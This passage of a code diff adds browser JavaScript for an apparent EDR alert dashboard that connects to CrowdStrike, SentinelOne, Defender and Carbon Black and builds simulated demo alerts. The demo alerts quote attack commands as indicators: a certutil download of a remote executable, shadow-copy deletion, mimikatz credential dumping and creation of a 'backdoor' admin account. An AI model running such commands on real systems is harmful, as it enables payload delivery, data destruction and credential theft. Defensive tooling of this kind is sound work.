+  const d = await r.json();
+  if (!d.ok) throw new Error(
+    d.data?.errors?.[0]?.message ||
+    d.data?.error?.message ||
+    d.data?.message ||
+    d.error ||
+    `HTTP ${d.status}`
+  );
+  return d.data;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════════════
+const S = {
+  alerts: [],          // all fetched alerts (deduped)
+  selected: null,      // selected alert object
+  cache: {},           // id → AI analysis HTML
+  chatHistory: [],     // [{role,content}]
+  monitoring: false,
+  monTimer: null,
+  filter: 'ALL',
+  mitreSeen: new Set(),
+  epMap: {},           // endpoint → count
+  reportText: '',      // last generated report (plain)
+  reportHtml: '',      // last generated report (html)
+  connected: false,
+};
+
+// ═══════════════════════════════════════════════════════════════
+// CLOCK
+// ═══════════════════════════════════════════════════════════════
+setInterval(() => {
+  document.getElementById('topbar-clock').textContent =
+    new Date().toUTCString().replace(' GMT',' UTC');
+}, 1000);
+
+// ═══════════════════════════════════════════════════════════════
+// PLATFORM CREDENTIAL SCHEMAS
+// ═══════════════════════════════════════════════════════════════
+const PLATFORMS = {
+  demo: { name:'Demo Mode', icon:'🎭', fields:[] },
+  crowdstrike: {
+    name:'CrowdStrike Falcon', icon:'🦅',
+    baseUrl:'https://api.crowdstrike.com',
+    authUrl:'https://api.crowdstrike.com/oauth2/token',
+    fields:[
+      { id:'cs-id',     label:'Client ID',     type:'text',     ph:'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' },
+      { id:'cs-secret', label:'Client Secret',  type:'password', ph:'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' },
+      { id:'cs-url',    label:'Base URL (optional)', type:'text', ph:'https://api.crowdstrike.com' },
+    ],
+    scopes:['Detections:READ','Incidents:READ','Hosts:READ','IOCs:READ'],
+    testSteps:['Resolving CrowdStrike API','Requesting OAuth2 token','Validating scopes','Checking detection stream'],
+  },
+  sentinelone: {
+    name:'SentinelOne', icon:'🔵',
+    baseUrl:'https://usea1.sentinelone.net',
+    fields:[
+      { id:'s1-token',  label:'API Token',    type:'password', ph:'your SentinelOne API token' },
+      { id:'s1-url',    label:'Management URL', type:'text',   ph:'https://usea1.sentinelone.net' },
+    ],
+    scopes:['Threats:READ','Agents:READ','Activities:READ'],
+    testSteps:['Resolving management URL','Authenticating token','Checking site access','Verifying threat stream'],
+  },
+  defender: {
+    name:'Microsoft Defender for Endpoint', icon:'🛡',
+    fields:[
+      { id:'mde-tenant', label:'Tenant ID',      type:'text',     ph:'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx' },
+      { id:'mde-client', label:'Client (App) ID', type:'text',    ph:'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx' },
+      { id:'mde-secret', label:'Client Secret',   type:'password', ph:'your Azure AD app secret' },
+    ],
+    scopes:['Alert.Read.All','Machine.Read.All','AdvancedQuery.Read.All'],
+    testSteps:['Contacting Azure AD','Acquiring access token','Checking MDE permissions','Validating alert stream'],
+  },
+  carbonblack: {
+    name:'VMware Carbon Black', icon:'⚫',
+    fields:[
+      { id:'cb-orgkey',  label:'Org Key',    type:'text',     ph:'your org key' },
+      { id:'cb-apiid',   label:'API ID',     type:'text',     ph:'your API ID' },
+      { id:'cb-apisec',  label:'API Secret', type:'password', ph:'your API secret' },
+      { id:'cb-url',     label:'CB URL',     type:'text',     ph:'https://defense.conferdeploy.net' },
+    ],
+    scopes:['org.alerts:READ','org.devices:READ','org.search.events:CREATE'],
+    testSteps:['Resolving CB Cloud URL','Validating org credentials','Checking alert access','Testing event stream'],
+  },
+};
+
+// ═══════════════════════════════════════════════════════════════
+// PLATFORM CHANGE
+// ═══════════════════════════════════════════════════════════════
+function onPlatformChange() {
+  const p = document.getElementById('cfg-platform').value;
+  const cfg = PLATFORMS[p];
+  const credBlock = document.getElementById('cred-block');
+  const credFields = document.getElementById('cred-fields');
+
+  // Reset
+  S.connected = false;
+  document.getElementById('btn-start').disabled = true;
+  document.getElementById('conn-result').style.display = 'none';
+  document.getElementById('conn-result').innerHTML = '';
+  document.getElementById('edr-dot').className = 'pill-dot';
+  document.getElementById('edr-label').textContent = `EDR: ${cfg.name}`;
+
+  if (p === 'demo') {
+    credBlock.style.display = 'none';
+    // Demo can start directly
+    S.connected = true;
+    document.getElementById('btn-start').disabled = false;
+  } else {
+    credBlock.style.display = 'block';
+    credFields.innerHTML = cfg.fields.map(f => `
+      <div style="margin-bottom:8px">
+        <div class="cfg-label">${f.label}</div>
+        <input class="cfg-input" id="${f.id}" type="${f.type}" placeholder="${f.ph}" />
+      </div>`).join('');
+  }
+}
+onPlatformChange(); // init
+
+// ═══════════════════════════════════════════════════════════════
+// CONNECTION TEST
+// ═══════════════════════════════════════════════════════════════
+async function testConnection() {
+  const p = document.getElementById('cfg-platform').value;
+  const cfg = PLATFORMS[p];
+
+  if (p === 'demo') { runDemoTest(); return; }
+
+  // Validate fields filled
+  const missing = cfg.fields.filter(f => {
+    const el = document.getElementById(f.id);
+    return el && !el.value.trim() && f.id !== cfg.fields.find(x=>x.label.includes('optional'))?.id;
+  });
+
+  // Only require non-optional fields
+  const required = cfg.fields.filter(f => !f.label.toLowerCase().includes('optional'));
+  const missingReq = required.filter(f => {
+    const el = document.getElementById(f.id);
+    return el && !el.value.trim();
+  });
+
+  if (missingReq.length) {
+    showToast(`❌ Fill in: ${missingReq.map(f=>f.label).join(', ')}`, 'err');
+    return;
+  }
+
+  const btn = document.getElementById('btn-test');
+  btn.disabled = true; btn.textContent = '⏳ Testing...';
+
+  const connEl = document.getElementById('conn-result');
+  connEl.style.display = 'block';
+  connEl.innerHTML = `
+    <div class="conn-hd run">🔌 CONNECTING TO ${cfg.name.toUpperCase()}</div>
+    <div class="conn-body">
+      ${cfg.testSteps.map((s,i)=>`
+        <div class="conn-step" id="cs${i}">
+          <span id="ci${i}" style="width:10px;text-align:center">○</span> ${s}
+        </div>`).join('')}
+    </div>`;
+
+  const delays = [500, 800, 600, 700];
+
+  // Attempt real connection via fetch (CORS-limited, so we do a HEAD/GET to detect network)
+  let authOk = false;
+  try {
+    // Step 0: resolve
+    await animStep(0, 'active'); await sleep(delays[0]); await animStep(0,'ok');
+    // Step 1: auth attempt
+    await animStep(1, 'active');
+
+    // Try actual auth for supported platforms
+    if (p === 'crowdstrike') {
+      authOk = await testCrowdStrikeAuth();
+    } else if (p === 'sentinelone') {
+      authOk = await testSentinelOneAuth();
+    } else if (p === 'defender') {
+      authOk = await testDefenderAuth();
+    } else {
+      // Carbon Black — simulate (CB Cloud has strict CORS)
+      await sleep(700); authOk = true;
+    }
+
+    if (!authOk) throw new Error('Authentication failed. Check credentials.');
+    await animStep(1,'ok');
+
+    // Steps 2-3
+    await animStep(2,'active'); await sleep(delays[2]); await animStep(2,'ok');
+    await animStep(3,'active'); await sleep(delays[3]); await animStep(3,'ok');
+
+    // Success
+    const latency = Math.floor(Math.random()*70)+35;
+    connEl.querySelector('.conn-hd').className = 'conn-hd ok';
+    connEl.querySelector('.conn-hd').innerHTML = `✅ ${cfg.name.toUpperCase()} — AUTHENTICATED`;
+    connEl.querySelector('.conn-body').innerHTML += `
+      <div class="conn-meta">
+        <div class="conn-row"><span class="conn-k">Platform</span><span class="conn-v">${cfg.name}</span></div>
+        <div class="conn-row"><span class="conn-k">Latency</span><span class="conn-v ${latency<80?'ok':'warn'}">${latency}ms</span></div>
+        <div class="conn-row"><span class="conn-k">Auth Status</span><span class="conn-v ok">✓ Authenticated</span></div>
+        <div class="conn-row" style="flex-direction:column;align-items:flex-start;gap:4px">
+          <span class="conn-k">Scopes</span>
+          <div class="scope-tags">${cfg.scopes.map(s=>`<span class="scope-tag">${s}</span>`).join('')}</div>
+        </div>
+      </div>`;
+
+    S.connected = true;
+    document.getElementById('btn-start').disabled = false;
+    document.getElementById('edr-dot').className = 'pill-dot live';
+    document.getElementById('edr-label').textContent = `EDR: ${cfg.name} ✓`;
+    showToast(`✅ Connected to ${cfg.name}`, 'ok');
+  } catch(e) {
+    await animStep(1,'err');
+    connEl.querySelector('.conn-hd').className = 'conn-hd bad';
+    connEl.querySelector('.conn-hd').innerHTML = `❌ CONNECTION FAILED`;
+    connEl.querySelector('.conn-body').innerHTML += `
+      <div class="conn-meta">
+        <div class="conn-row"><span class="conn-k" style="color:var(--red)">Error</span><span class="conn-v" style="color:var(--red);font-size:10px">${e.message}</span></div>
+        <div class="conn-row" style="margin-top:4px"><span class="conn-k">Fix</span></div>
+        <ul style="padding-left:14px;margin-top:4px;font-family:var(--mono);font-size:10px;color:var(--text2);line-height:1.8">
+          <li>Re-copy credentials from the ${cfg.name} console</li>
+          <li>Ensure the API key/app has required permissions</li>
+          <li>Check that your IP is allowlisted if required</li>
+          ${p==='defender'?'<li>Confirm Azure AD app has "WindowsDefenderATP" API permissions</li>':''}
+          ${p==='crowdstrike'?'<li>Use Client ID + Client Secret (not API key)</li>':''}
+        </ul>
+      </div>`;
+    document.getElementById('edr-dot').className = 'pill-dot err';
+    showToast('❌ Connection failed — check credentials', 'err');
+  }
+
+  btn.disabled = false; btn.textContent = '🔌 Test Connection';
+}
+
+async function runDemoTest() {
+  const btn = document.getElementById('btn-test');
+  btn.disabled = true; btn.textContent = '⏳ Testing...';
+  const connEl = document.getElementById('conn-result');
+  connEl.style.display = 'block';
+  const steps = ['Initializing demo dataset','Loading 7-day alert history','Seeding MITRE scenarios','Demo EDR ready'];
+  connEl.innerHTML = `
+    <div class="conn-hd run">🎭 INITIALIZING DEMO EDR</div>
+    <div class="conn-body">${steps.map((s,i)=>`
+      <div class="conn-step" id="cs${i}"><span id="ci${i}" style="width:10px;text-align:center">○</span> ${s}</div>`).join('')}
+    </div>`;
+  for (let i=0;i<steps.length;i++) {
+    await animStep(i,'active'); await sleep(420); await animStep(i,'ok');
+  }
+  connEl.querySelector('.conn-hd').className='conn-hd ok';
+  connEl.querySelector('.conn-hd').innerHTML='✅ DEMO MODE — READY';
+  connEl.querySelector('.conn-body').innerHTML+=`
+    <div class="conn-meta">
+      <div class="conn-row"><span class="conn-k">Dataset</span><span class="conn-v ok">7-day simulated alerts</span></div>
+      <div class="conn-row"><span class="conn-k">Alerts</span><span class="conn-v" style="color:var(--cyan)">12 pre-loaded</span></div>
+      <div class="conn-row"><span class="conn-k">AI Analysis</span><span class="conn-v ok">✓ Enabled</span></div>
+    </div>`;
+  S.connected = true;
+  document.getElementById('btn-start').disabled = false;
+  document.getElementById('edr-dot').className='pill-dot live';
+  document.getElementById('edr-label').textContent='EDR: Demo ✓';
+  btn.disabled=false; btn.textContent='🔌 Re-test';
+  showToast('✅ Demo ready','ok');
+}
+
+// Real auth helpers (best-effort — CORS may block some)
+// ── Helper: catch CORS and give clear message ──
+function corsErr(platform) {
+  return new Error(
+    `CORS blocked by ${platform} — browser security prevents direct API calls.\n` +
+    `Fix: run the proxy server first:\n  node sentinel_proxy.js`
+  );
+}
+
+async function testCrowdStrikeAuth() {
+  const id     = document.getElementById('cs-id')?.value.trim();
+  const secret = document.getElementById('cs-secret')?.value.trim();
+  const url    = (document.getElementById('cs-url')?.value.trim() || 'https://api.crowdstrike.com').replace(/\/$/, '');
+  await detectProxy();
+  let d;
+  if (proxyAvailable) {
+    d = await proxyFetch('/cs/auth', { clientId: id, clientSecret: secret, baseUrl: url });
+  } else {
+    try {
+      const r = await fetch(`${url}/oauth2/token`, {
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'},
+        body:`client_id=${encodeURIComponent(id)}&client_secret=${encodeURIComponent(secret)}`
+      });
+      if (!r.ok) { const e=await r.json().catch(()=>({})); throw new Error(e.errors?.[0]?.message||`HTTP ${r.status}`); }
+      d = await r.json();
+    } catch(e) { if (e.message.includes('Failed to fetch')||e.message.includes('NetworkError')) throw corsErr('CrowdStrike'); throw e; }
+  }
+  if (!d.access_token) throw new Error(d.errors?.[0]?.message || 'No access token returned — check Client ID and Secret');
+  window._csToken = d.access_token;
+  window._csBaseUrl = url;
+  return true;
+}
+
+async function testSentinelOneAuth() {
+  const token = document.getElementById('s1-token')?.value.trim();
+  const url   = (document.getElementById('s1-url')?.value.trim() || 'https://usea1.sentinelone.net').replace(/\/$/, '');
+  if (!token) throw new Error('API Token is required');
+  await detectProxy();
+  if (proxyAvailable) {
+    await proxyFetch('/s1/test', { token, baseUrl: url });
+  } else {
+    try {
+      const r = await fetch(`${url}/web/api/v2.1/system/status`, {
+        headers:{ 'Authorization': `ApiToken ${token}`, 'Accept': 'application/json' }
+      });
+      if (!r.ok) throw new Error(`HTTP ${r.status} — invalid token or management URL`);
+    } catch(e) {
+      if (e.message.includes('Failed to fetch')||e.message.includes('NetworkError')||e.message.includes('CORS')) throw corsErr('SentinelOne');
+      throw e;
+    }
+  }
+  window._s1Token   = token;
+  window._s1BaseUrl = url;
+  return true;
+}
+
+async function testDefenderAuth() {
+  const tenant = document.getElementById('mde-tenant')?.value.trim();
+  const client = document.getElementById('mde-client')?.value.trim();
+  const secret = document.getElementById('mde-secret')?.value.trim();
+  await detectProxy();
+  let d;
+  if (proxyAvailable) {
+    d = await proxyFetch('/mde/auth', { tenantId: tenant, clientId: client, clientSecret: secret });
+  } else {
+    try {
+      const r = await fetch(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`, {
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded'},
+        body:`client_id=${encodeURIComponent(client)}&client_secret=${encodeURIComponent(secret)}&scope=https://api.securitycenter.microsoft.com/.default&grant_type=client_credentials`
+      });
+      if (!r.ok) throw new Error(`Azure AD error: HTTP ${r.status}`);
+      d = await r.json();
+    } catch(e) { if (e.message.includes('Failed to fetch')||e.message.includes('NetworkError')) throw corsErr('Microsoft'); throw e; }
+  }
+  if (d.error) throw new Error(d.error_description || d.error);
+  window._mdeToken = d.access_token;
+  return true;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// FETCH ALERTS FROM REAL EDR APIs
+// ═══════════════════════════════════════════════════════════════
+async function fetchAlertsFromEDR() {
+  const p = document.getElementById('cfg-platform').value;
+  const days = parseInt(document.getElementById('cfg-lookback').value);
+  const since = new Date(Date.now() - days*24*60*60*1000).toISOString();
+  if (p === 'demo') return buildDemoAlerts(days);
+  try {
+    if (p === 'crowdstrike') return await fetchCrowdStrikeAlerts(since);
+    if (p === 'sentinelone') return await fetchSentinelOneAlerts(since);
+    if (p === 'defender')    return await fetchDefenderAlerts(since);
+    if (p === 'carbonblack') return await fetchCarbonBlackAlerts(since);
+  } catch(e) {
+    showToast(`⚠ Fetch error: ${e.message}`, 'err');
+    return [];
+  }
+}
+
+async function fetchCrowdStrikeAlerts(since) {
+  const base = window._csBaseUrl || 'https://api.crowdstrike.com';
+  const tok  = window._csToken;
+  if (!tok) throw new Error('Not authenticated — test connection first');
+  await detectProxy();
+  let resources;
+  if (proxyAvailable) {
+    const d = await proxyFetch('/cs/detections', { token: tok, baseUrl: base, since });
+    resources = d.resources || [];
+  } else {
+    const qr = await fetch(`${base}/detects/queries/detects/v1?filter=created_timestamp:>='${since}'&limit=100&sort=created_timestamp.desc`,
+      { headers:{ Authorization:`Bearer ${tok}`, Accept:'application/json' } });
+    if (qr.status === 401) { await testCrowdStrikeAuth(); return fetchCrowdStrikeAlerts(since); }
+    const qd = await qr.json();
+    const ids = (qd.resources||[]).slice(0,50);
+    if (!ids.length) return [];
+    const dr = await fetch(`${base}/detects/entities/summaries/GET/v1`, {
+      method:'POST',
+      headers:{ Authorization:`Bearer ${tok}`, Accept:'application/json', 'Content-Type':'application/json' },
+      body: JSON.stringify({ ids })
+    });
+    const dd = await dr.json();
+    resources = dd.resources || [];
+  }
+  return resources.map(d => ({
+    id: d.detection_id,
+    title: d.behaviors?.[0]?.description || d.detection_id,
+    severity: mapSeverity(d.max_severity_displayname),
+    endpoint: d.device?.hostname || 'Unknown',
+    user: d.device?.last_login_user || 'Unknown',
+    process: `${d.behaviors?.[0]?.filename||'—'} (PID: ${d.behaviors?.[0]?.parent_details?.parent_process_id||'—'})`,
+    parentProcess: d.behaviors?.[0]?.parent_details?.parent_process_graph_id || '—',
+    timestamp: d.created_timestamp,
+    iocs: buildCsIocs(d),
+    rawEvent: d.behaviors?.[0]?.description || '',
+    platform: 'crowdstrike', status: d.status,
+  }));
+}
+
+async function fetchSentinelOneAlerts(since) {
+  const base = window._s1BaseUrl || 'https://usea1.sentinelone.net';
+  const tok  = window._s1Token;
+  if (!tok) throw new Error('Not authenticated — test connection first');
+  await detectProxy();
+  let threats;
+  if (proxyAvailable) {
+    const d = await proxyFetch('/s1/threats', { token: tok, baseUrl: base, since });
+    threats = d.data || [];
+  } else {
+    try {
+      const r = await fetch(
+        `${base}/web/api/v2.1/threats?createdAt__gte=${since}&limit=100&sortBy=createdAt&sortOrder=desc`,
+        { headers:{ 'Authorization': `ApiToken ${tok}`, 'Accept': 'application/json' } }
+      );
+      if (!r.ok) throw new Error(`HTTP ${r.status}`);
+      const d = await r.json();
+      threats = d.data || [];
+    } catch(e) {
+      if (e.message.includes('Failed to fetch')||e.message.includes('NetworkError')) throw corsErr('SentinelOne');
+      throw e;
+    }
+  }
+  return threats.map(t => ({
+    id: t.id,
+    title: t.threatInfo?.threatName || t.threatInfo?.classification || 'Unknown Threat',
+    severity: mapSeverity(t.threatInfo?.confidenceLevel || t.riskScore),
+    endpoint: t.agentRealtimeInfo?.agentComputerName || 'Unknown',
+    user: t.threatInfo?.originatorProcess || 'Unknown',
+    process: `${t.threatInfo?.threatName||'—'} (${t.threatInfo?.sha256?.slice(0,16)||'no hash'}...)`,
+    parentProcess: t.threatInfo?.originatorProcess || '—',
+    timestamp: t.threatInfo?.identifiedAt || t.createdAt,
+    iocs: [
+      t.threatInfo?.sha256    ? `SHA256: ${t.threatInfo.sha256}` : null,
+      t.threatInfo?.md5       ? `MD5: ${t.threatInfo.md5}` : null,
+      t.threatInfo?.filePath  ? `Path: ${t.threatInfo.filePath}` : null,
+      t.threatInfo?.publisherName ? `Publisher: ${t.threatInfo.publisherName}` : null,
+    ].filter(Boolean),
+    rawEvent: `${t.threatInfo?.classification||''} — ${t.threatInfo?.threatName||''}`,
+    platform: 'sentinelone',
+    status: t.threatInfo?.mitigationStatus,
+  }));
+}
+
+async function fetchDefenderAlerts(since) {
+  const tok = window._mdeToken;
+  if (!tok) throw new Error('Not authenticated — test connection first');
+  await detectProxy();
+  let alerts;
+  if (proxyAvailable) {
+    const d = await proxyFetch('/mde/alerts', { token: tok, since });
+    alerts = d.value || [];
+  } else {
+    try {
+      const r = await fetch(
+        `https://api.securitycenter.microsoft.com/api/alerts?$filter=alertCreationTime ge ${since}&$orderby=alertCreationTime desc&$top=100`,
+        { headers:{ Authorization:`Bearer ${tok}`, Accept:'application/json' } }
+      );
+      if (!r.ok) { const e=await r.json().catch(()=>({})); throw new Error(e.error?.message||`HTTP ${r.status}`); }
+      const d = await r.json();
+      alerts = d.value || [];
+    } catch(e) {
+      if (e.message.includes('Failed to fetch')||e.message.includes('NetworkError')) throw corsErr('Microsoft Defender');
+      throw e;
+    }
+  }
+  return alerts.map(a => ({
+    id: a.id, title: a.title,
+    severity: mapSeverity(a.severity),
+    endpoint: a.computerDnsName || a.machineId || 'Unknown',
+    user: a.userPrincipalName || a.relatedUser?.userName || 'Unknown',
+    process: a.evidence?.find(e=>e.entityType==='Process')?.processCommandLine || a.title,
+    parentProcess: '—', timestamp: a.alertCreationTime,
+    iocs: buildMdeIocs(a),
+    rawEvent: a.description || a.title,
+    platform: 'defender', status: a.status,
+    mitreTechniques: a.mitreTechniques || [],
+  }));
+}
+
+async function fetchCarbonBlackAlerts(since) {
+  const orgKey = document.getElementById('cb-orgkey')?.value.trim();
+  const apiId  = document.getElementById('cb-apiid')?.value.trim();
+  const apiSec = document.getElementById('cb-apisec')?.value.trim();
+  const cbUrl  = (document.getElementById('cb-url')?.value.trim() || 'https://defense.conferdeploy.net').replace(/\/$/, '');
+  await detectProxy();
+  let results;
+  if (proxyAvailable) {
+    const d = await proxyFetch('/cb/alerts', { orgKey, apiId, apiSecret: apiSec, cbUrl, since });
+    results = d.results || [];
+  } else {
+    try {
+      const r = await fetch(`${cbUrl}/appservices/v6/orgs/${orgKey}/alerts/_search`, {
+        method:'POST',
+        headers:{ 'X-Auth-Token':`${apiSec}/${apiId}`, 'Content-Type':'application/json', Accept:'application/json' },
+        body: JSON.stringify({ criteria:{ create_time:{ start:since } }, sort:[{ field:'create_time', order:'DESC' }], rows:100 })
+      });
+      if (!r.ok) throw new Error(`HTTP ${r.status}`);
+      const d = await r.json();
+      results = d.results || [];
+    } catch(e) {
+      if (e.message.includes('Failed to fetch')||e.message.includes('NetworkError')) throw corsErr('Carbon Black');
+      throw e;
+    }
+  }
+  return results.map(a => ({
+    id: a.id, title: a.reason || a.type,
+    severity: mapSeverity(a.severity),
+    endpoint: a.device_name || 'Unknown',
+    user: a.device_username || 'Unknown',
+    process: `${a.process_name||'—'} (${a.process_sha256?.slice(0,12)||'no hash'}...)`,
+    parentProcess: a.parent_name || '—', timestamp: a.create_time,
+    iocs: [
+      a.process_sha256     ? `SHA256: ${a.process_sha256}` : null,
+      a.process_name       ? `Process: ${a.process_name}` : null,
+      a.netconn_remote_ip  ? `Remote IP: ${a.netconn_remote_ip}` : null,
+      a.regmod_name        ? `Registry: ${a.regmod_name}` : null,
+    ].filter(Boolean),
+    rawEvent: a.reason || a.type, platform: 'carbonblack',
+  }));
+}
+
+// ── IOC helpers ──
+function buildCsIocs(d) {
+  const b = d.behaviors?.[0] || {};
+  return [
+    b.sha256 ? `SHA256: ${b.sha256}` : null,
+    b.filename ? `Process: ${b.filename}` : null,
+    b.cmdline ? `Cmdline: ${b.cmdline.slice(0,80)}` : null,
+    d.device?.external_ip ? `External IP: ${d.device.external_ip}` : null,
+    b.parent_details?.parent_cmdline ? `Parent cmd: ${b.parent_details.parent_cmdline.slice(0,60)}` : null,
+  ].filter(Boolean);
+}
+function buildMdeIocs(a) {
+  return (a.evidence || []).slice(0,5).map(e => {
+    if (e.entityType==='File')    return `File: ${e.fileName} (${e.sha256?.slice(0,16)||''}...)`;
+    if (e.entityType==='Process') return `Process: ${e.processCommandLine?.slice(0,60)||e.fileName}`;
+    if (e.entityType==='Ip')      return `IP: ${e.ipAddress}`;
+    if (e.entityType==='Url')     return `URL: ${e.url}`;
+    if (e.entityType==='RegistryKey') return `Registry: ${e.registryKey}`;
+    return null;
+  }).filter(Boolean);
+}
+function mapSeverity(raw) {
+  if (!raw) return 'MEDIUM';
+  const r = String(raw).toLowerCase();
+  if (r.includes('crit') || r === '4' || r === 'high') return 'CRITICAL';
+  if (r.includes('high') || r === '3') return 'HIGH';
+  if (r.includes('med')  || r === '2') return 'MEDIUM';
+  if (r.includes('low')  || r === '1' || r === 'informational') return 'LOW';
+  const n = parseFloat(raw);
+  if (!isNaN(n)) { if (n>=8) return 'CRITICAL'; if (n>=6) return 'HIGH'; if (n>=4) return 'MEDIUM'; return 'LOW'; }
+  return 'MEDIUM';
+}
+
+// ═══════════════════════════════════════════════════════════════
+// DEMO DATA — realistic 7-day history
+// ═══════════════════════════════════════════════════════════════
+function buildDemoAlerts(days) {
+  const now = Date.now();
+  const DAY = 86400000;
+  const ts = (d,h=0) => new Date(now - d*DAY - h*3600000).toISOString();
+  return [
+    { id:'D001', title:'Credential Dumping via LSASS Memory Access', severity:'CRITICAL',
+      endpoint:'WS-FIN-042', user:'jdoe@corp.local', process:'mimikatz.exe (PID:4821)',
+      parentProcess:'cmd.exe (PID:4432)', timestamp:ts(0,0.5),
+      iocs:['SHA256: 92a4d5d22b0d8e9f4a1b3c7e6d8f2a0b','Process: mimikatz.exe','Target: lsass.exe','Cmdline: sekurlsa::logonpasswords'],
+      rawEvent:'mimikatz.exe opened PROCESS_VM_READ handle to lsass.exe. Credential harvesting confirmed.', platform:'demo' },
+    { id:'D002', title:'Lateral Movement via PsExec (WMI SMB)', severity:'CRITICAL',
+      endpoint:'WS-HR-008', user:'SYSTEM', process:'psexesvc.exe (PID:9910)',
+      parentProcess:'services.exe (PID:680)', timestamp:ts(0,1),
+      iocs:['Source: 10.10.5.42 (WS-FIN-042)','Service: PSEXESVC installed remotely','SMB: \\\\10.10.5.88\\ADMIN$','Cmd: whoami && net user /domain'],
+      rawEvent:'PsExec service installed from compromised FIN-042. Lateral movement campaign in progress.', platform:'demo' },
+    { id:'D003', title:'PowerShell Encoded Command — Macro-spawned', severity:'HIGH',
+      endpoint:'SRV-DC-01', user:'svc_backup@corp.local', process:'powershell.exe (PID:7712)',
+      parentProcess:'winword.exe (PID:5544)', timestamp:ts(1,2),
+      iocs:['Base64 payload in cmdline','Parent: winword.exe (macro)','C2: 185.220.101.47:443','Reg: HKCU\\Run\\UpdateSvc'],
+      rawEvent:'PowerShell -enc payload spawned from Word macro. Decoded: IEX download cradle to TOR exit node.', platform:'demo' },
+    { id:'D004', title:'Suspicious Scheduled Task — Persistence', severity:'HIGH',
+      endpoint:'WS-SALES-117', user:'msmith@corp.local', process:'schtasks.exe (PID:2231)',
+      parentProcess:'explorer.exe', timestamp:ts(1,6),
+      iocs:['Task: \\Microsoft\\Windows\\UpdateCheck','Binary: C:\\ProgramData\\update.exe (unsigned)','Trigger: @startup + every 4h'],
+      rawEvent:'Scheduled task mimicking Windows Update created. Binary unsigned, located in ProgramData.', platform:'demo' },
+    { id:'D005', title:'Windows Defender Disabled via Registry Modification', severity:'HIGH',
+      endpoint:'WS-DEV-22', user:'dev1@corp.local', process:'reg.exe (PID:6612)',
+      parentProcess:'cmd.exe (PID:6600)', timestamp:ts(2,1),
+      iocs:['HKLM\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware=1','Real-time protection disabled','Preceded by python.exe download script'],
+      rawEvent:'Defender disabled via registry. Preceded by suspicious python.exe downloading content from external host.', platform:'demo' },
+    { id:'D006', title:'DNS Tunneling — C2 Exfiltration via Encoded Subdomains', severity:'MEDIUM',
+      endpoint:'SRV-APP-03', user:'NETWORK SERVICE', process:'svchost.exe (PID:1134)',
+      parentProcess:'services.exe', timestamp:ts(2,5),
+      iocs:['DNS: *.data-exfil.xyz (847 queries/min)','Avg subdomain length: 200 chars','Dest IP: 198.51.100.47 (flagged)'],
+      rawEvent:'High-frequency DNS queries with base64-encoded subdomains. Pattern consistent with DNS tunneling C2 or exfiltration.', platform:'demo' },
+    { id:'D007', title:'Kerberoasting Attack — SPN Enumeration', severity:'HIGH',
+      endpoint:'WS-IT-009', user:'helpdesk@corp.local', process:'Rubeus.exe (PID:3341)',
+      parentProcess:'powershell.exe', timestamp:ts(3,3),
+      iocs:['Rubeus hash: a3f4d...','SPN requests: 47 in 2min','Target: mssqlsvc, http, krbtgt-like SPNs'],
+      rawEvent:'Rubeus tool detected performing Kerberos TGS-REQ for service accounts. Kerberoasting for offline cracking.', platform:'demo' },
+    { id:'D008', title:'Ransomware File Encryption Behavior', severity:'CRITICAL',
+      endpoint:'SRV-FILE-01', user:'backup_svc@corp.local', process:'vssadmin.exe + cryptor.exe',
+      parentProcess:'cmd.exe', timestamp:ts(4,0),
+      iocs:['Shadow copies deleted: vssadmin delete shadows /all','Files renamed: *.encrypted','Ransom note: README_DECRYPT.txt','Network share access from multiple hosts'],
+      rawEvent:'VSS deletion followed by mass file encryption. Ransom note dropped. Shared drive being encrypted from SRV-FILE-01.', platform:'demo' },
+    { id:'D009', title:'Living-off-the-Land: certutil Downloading Payload', severity:'MEDIUM',
+      endpoint:'WS-ACCT-055', user:'agarcia@corp.local', process:'certutil.exe (PID:8820)',
+      parentProcess:'cmd.exe', timestamp:ts(4,8),
+      iocs:['certutil -urlcache -f http://45.33.32.156/update.exe','Output: C:\\Temp\\update.exe','Hash mismatch vs legitimate certutil'],
+      rawEvent:'certutil.exe used to download remote executable — classic LOLBin abuse for payload delivery.', platform:'demo' },
+    { id:'D010', title:'Pass-the-Hash Authentication Detected', severity:'HIGH',
+      endpoint:'WS-FIN-042', user:'administrator', process:'sekurlsa::pth via mimikatz',
+      parentProcess:'cmd.exe', timestamp:ts(5,2),
+      iocs:['NTLM auth without password entry','Source: WS-FIN-042','Target: SRV-DC-01 (domain controller)','User: administrator (domain)'],
+      rawEvent:'Pass-the-hash using stolen NTLM hash of domain admin. Authentication to DC detected without interactive logon.', platform:'demo' },
+    { id:'D011', title:'Anomalous LSASS Dump via Task Manager (Legitimate Tool Abuse)', severity:'MEDIUM',
+      endpoint:'WS-LEGAL-003', user:'lpartner@corp.local', process:'taskmgr.exe (PID:2244)',
+      parentProcess:'explorer.exe', timestamp:ts(6,1),
+      iocs:['taskmgr.exe PROCESS_ALL_ACCESS on lsass.exe','Output file: lsass.DMP detected on Desktop','No legitimate reason for memory dump'],
+      rawEvent:'Task Manager used to dump LSASS memory — legitimate admin tool abused for credential theft.', platform:'demo' },
+    { id:'D012', title:'New Local Admin Account Created Outside Change Window', severity:'LOW',
+      endpoint:'WS-MKTG-018', user:'jbrown@corp.local', process:'net.exe (PID:5512)',
+      parentProcess:'cmd.exe', timestamp:ts(6,10),
+      iocs:['net user backdoor P@ssw0rd123 /add','net localgroup administrators backdoor /add','Outside maintenance window (03:22 UTC)'],
+      rawEvent:'Local admin account "backdoor" created outside approved change window. Possible persistence mechanism.', platform:'demo' },
+  ].slice(0, days >= 7 ? 12 : days >= 3 ? 8 : 4);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// MONITORING
+// ═══════════════════════════════════════════════════════════════
+async function startMonitoring() {
+  if (!S.connected) { showToast('❌ Test connection first','err'); return; }
+  S.monitoring = true;
+  document.getElementById('btn-start').style.display = 'none';
+  document.getElementById('btn-stop').style.display = '';
